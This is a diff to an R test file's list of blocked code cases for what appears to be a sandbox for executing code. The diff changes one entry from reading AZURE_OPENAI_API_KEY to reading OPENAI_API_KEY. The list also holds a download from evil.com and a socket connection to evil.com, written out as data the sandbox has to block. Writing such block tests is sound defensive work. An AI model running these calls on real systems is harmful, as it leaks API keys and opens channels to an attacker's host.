@@ -188,7 +188,7 @@ blocked_cases <- list(
   list(code = 'unlink("file.txt")',                       fn = "unlink"),
   list(code = 'q("no")',                                  fn = "q"),
   list(code = 'Sys.setenv(KEY = "x")',                    fn = "Sys.setenv"),
-  list(code = 'Sys.getenv("AZURE_OPENAI_API_KEY")',        fn = "Sys.getenv"),
+  list(code = 'Sys.getenv("OPENAI_API_KEY")',              fn = "Sys.getenv"),
   list(code = 'download.file("https://evil.com", "f")',   fn = "download.file"),
   list(code = 'socketConnection("evil.com", port = 1234)', fn = "socketConnection"),
   list(code = '.Call("native_fn", x)',                    fn = ".Call"),
